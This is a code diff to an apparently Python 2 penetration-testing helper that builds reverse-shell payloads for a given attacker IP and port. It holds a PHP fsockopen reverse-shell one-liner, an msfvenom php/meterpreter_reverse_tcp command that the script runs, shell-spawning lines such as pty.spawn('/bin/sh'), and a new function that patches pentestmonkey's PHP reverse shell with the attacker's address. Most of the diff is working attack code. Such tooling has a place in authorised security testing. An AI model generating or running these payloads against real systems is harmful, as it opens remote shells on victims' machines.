@@ -11,6 +11,7 @@
 # Import the modules needed to run the script.
 import sys, os
 import pyperclip
+import fileinput
 if len(sys.argv) != 3:
     print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
     sys.exit(0) 
@@ -64,6 +65,7 @@ def menu1():
     print "24. Perl Oneliner"
     print "25. Python Oneliner"
     print "26. PHP Oneliner"
+    print "27. Edit pentestmonkey's php file"
     print "9. Back"
     print "0. Quit"
     choice = raw_input(" >>  ")
@@ -103,23 +105,23 @@ def python():
 
 # python tty
 def python_tty():
-    pyperclip.copy('python -c \'import pty; pty.spawn("/bin/sh")\'')
-    sys.exit
+    shellcode = 'python -c \'import pty; pty.spawn("/bin/sh")\''
+    oneliner(shellcode)
 
 #bash tty code	
 def bash_tty():
-    pyperclip.copy('echo os.system(\'/bin/bash\')')
-    sys.exit
+    shellcode = 'echo os.system(\'/bin/bash\')'
+    oneliner(shellcode)
 
 #bin code	
 def bin_tty():
-    pyperclip.copy('/bin/sh -i')
-    sys.exit
+    shellcode = '/bin/sh -i'
+    oneliner(shellcode)
 
 #perl code
 def perl_tty():
-    pyperclip.copy('perl: exec "/bin/sh";')
-    sys.exit
+    shellcode = 'perl: exec "/bin/sh";'
+    oneliner(shellcode)
 
 #MSVENOM Linux
 def linux_msvenom():
@@ -135,21 +137,6 @@ def windows_msvenom():
 def php_msvenom():
     shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % args
     msfvenom(shellcode)
-
-#MSFVENOM shortcode
-def msfvenom(shellcode):
-    warning ="Make sure you are using the correct payload in MSFConsole"
-    os.system('clear')
-    print "Writing Shell"
-    print shellcode
-    os.system(shellcode)
-    print warning
-
-#One liners
-def oneliner(shellcode):
-	print shellcode + " Copied to clipboard"
-	pyperclip.copy(shellcode)
-	sys.exit
 
 #Bash Oneliner
 def bash_oneliner():
@@ -169,8 +156,46 @@ def python_oneliner():
 #PHP Oneliner
 def php_oneliner():
 	shellcode = 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args
-
 	oneliner(shellcode)
+
+#MSFVENOM shortcode
+def msfvenom(shellcode):
+    warning ="Make sure you are using the correct payload in MSFConsole"
+    os.system('clear')
+    print "Writing Shell"
+    print shellcode
+    os.system(shellcode)
+    print warning
+
+#One liner shortcode
+def oneliner(shellcode):
+	print shellcode + " Copied to clipboard"
+	pyperclip.copy(shellcode)
+	sys.exit
+
+#Edit PHP Monkey's File	
+def php_file():
+	#for line in fileinput.input('php-reverse-shell.php', inplace = 1): 
+	#	print line.replace("127.0.0.1", IP_ADDR),
+	#	fileinput.close()
+	#for line in fileinput.input('php-reverse-shell.php', inplace = 1): 
+	#	print line.replace("1234", PORT),
+	#	fileinput.close()
+	fin = open("php-reverse-shell.php")
+	fout = open("b.txt", "wt")
+	for line in fin:
+		fout.write( line.replace('127.0.0.1', IP_ADDR) )
+	fin.close()
+	fout.close()
+
+	fin1 = open("b.txt")
+	fout1 = open("yourpythonfile.php", "wt")
+	for line in fin1:
+		fout1.write( line.replace('1234', PORT) )
+	fin1.close()
+	fout1.close()
+	os.system('rm b.txt')
+
 # =======================
 #    MENUS DEFINITIONS
 # =======================
@@ -192,6 +217,7 @@ menu_actions = {
     '24': perl_oneliner,
     '25': python_oneliner,
     '26': php_oneliner,
+    '27': php_file,
     '9': back,
     '0': exit,
 }
